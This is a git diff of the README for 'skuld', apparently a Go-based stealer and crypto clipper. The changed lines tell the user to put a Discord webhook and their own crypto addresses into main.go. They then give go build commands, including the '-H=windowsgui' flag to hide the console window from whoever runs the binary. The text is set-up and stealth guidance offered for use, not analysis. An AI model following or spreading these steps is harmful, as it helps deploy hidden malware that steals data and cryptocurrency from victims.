@@ -104,11 +104,13 @@ You can use the Project template:
 
 - Open `main.go` and edit config with your Discord webhook and your crypto addresses
 
-- Build the template: (reduce binary size by using `-s -w` and hide the console by using `-H=windowsgui` ldflags)
+- Build the template: (reduce binary size by using `-s -w`)
 
 ```bash
-go build -ldflags "-s -w -H=windowsgui"
+go build -ldflags "-s -w"
 ```
+
+(You can hide the console without `hideconsole` module by using `go build -ldflags "-s -w -H=windowsgui"`, but you must remove `program.IsAlreadyRunning()` check from `main.go` before)
 
 
 - You can also use skuld in your own Go code. Just import the desired module like this:
